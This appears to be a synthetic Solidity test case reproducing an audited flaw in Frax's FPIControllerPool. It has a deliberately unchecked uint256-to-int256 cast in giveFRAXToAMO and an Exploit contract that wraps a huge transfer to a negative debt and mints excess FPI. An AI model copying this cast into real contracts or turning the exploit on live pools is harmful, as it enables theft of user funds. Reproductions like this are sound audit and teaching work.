// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Frax FPIControllerPool — unsafe uint256 to int256 cast (Trail of Bits, TOB-FRAXFPI-4, Jun 2022)
    SYNTHETIC, cheatcode-free reduction.
    giveFRAXToAMO casts frax_amount to int256 with no upper-bound check. A full-width value of
    2^256 - 1000e18 becomes -1000e18, so the 10_000_000e18 borrow cap still passes and the pool
    mints 10_001_000e18 FPI of "spare" capacity. The true transfer is the full-width amount.
    The control accumulates in uint256 and mints 0. */

contract MiniERC20 {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory name_, string memory symbol_) {
        name = name_;
        symbol = symbol_;
        decimals = 18;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract FPIControllerPool {
    uint256 public constant CAP = 10_000_000 ether;

    MiniERC20 public frax;
    MiniERC20 public fpi;
    int256 public frax_borrow_cap;
    int256 public frax_borrowed_sum;
    mapping(address => int256) public frax_borrowed_balances;
    mapping(address => bool) public amos;

    int256 public truncatedCast;
    uint256 public trueTransferred;
    uint256 public mintedFpi;
    uint256 public fullWidthRecorded;
    uint256 public fullWidthMinted;

    constructor(MiniERC20 frax_, MiniERC20 fpi_) {
        frax = frax_;
        fpi = fpi_;
        frax_borrow_cap = int256(uint256(CAP));
    }

    function addAMO(address amo) external {
        require(amo != address(0), "Zero address detected");
        amos[amo] = true;
    }

    function giveFRAXToAMO(address destination_amo, uint256 frax_amount) external {
        require(amos[destination_amo], "Invalid AMO");
        // @> VULN: int256(frax_amount) wraps above 2^255-1, so a full-width transfer is accounted as a small negative
        int256 frax_amount_i256 = int256(frax_amount);
        require((frax_borrowed_sum + frax_amount_i256) <= frax_borrow_cap, "Borrow cap");
        frax_borrowed_balances[destination_amo] += frax_amount_i256;
        frax_borrowed_sum += frax_amount_i256;
        frax.transfer(destination_amo, frax_amount);
        truncatedCast = frax_amount_i256;
        trueTransferred = frax_amount;
    }

    function mintFPI() external returns (uint256 fpi_out) {
        int256 spare = frax_borrow_cap - frax_borrowed_sum;
        require(spare > 0, "no spare");
        fpi_out = uint256(spare);
        fpi.mint(msg.sender, fpi_out);
        mintedFpi = fpi_out;
    }

    function giveFullWidth(address destination_amo, uint256 frax_amount) external returns (uint256 fpi_out) {
        require(amos[destination_amo], "Invalid AMO");
        uint256 borrowed = frax_amount;
        fullWidthRecorded = borrowed;
        if (borrowed <= CAP) {
            frax.transfer(destination_amo, frax_amount);
            fpi_out = CAP - borrowed;
            fpi.mint(msg.sender, fpi_out);
        } else {
            fpi_out = 0;
        }
        fullWidthMinted = fpi_out;
    }
}

contract Exploit {
    MiniERC20 public frax; // nonce 1
    MiniERC20 public fpi; // nonce 2
    FPIControllerPool public pool; // nonce 3

    uint256 public minted;
    int256 public truncated;
    uint256 public trueAmountSeen;

    constructor() {
        frax = new MiniERC20("FRAX", "FRAX");
        fpi = new MiniERC20("FPI", "FPI");
        pool = new FPIControllerPool(frax, fpi);
    }

    function trueAmount() public pure returns (uint256) {
        return type(uint256).max - 1000 ether + 1;
    }

    function run() external {
        uint256 amount = trueAmount();
        frax.mint(address(pool), amount);
        pool.addAMO(address(this));
        pool.giveFRAXToAMO(address(this), amount);
        minted = pool.mintFPI();
        truncated = pool.truncatedCast();
        trueAmountSeen = pool.trueTransferred();
        require(truncated == -1000 ether, "cast is not -1000e18");
        require(trueAmountSeen == amount, "true width dropped");
        require(minted == pool.CAP() + 1000 ether, "mint is not cap plus truncated magnitude");
        require(fpi.balanceOf(address(this)) == minted, "fpi not received");
        require(frax.balanceOf(address(this)) == amount, "true frax not received");
        require(pool.frax_borrowed_sum() == truncated, "accounting does not match the cast");
    }
}
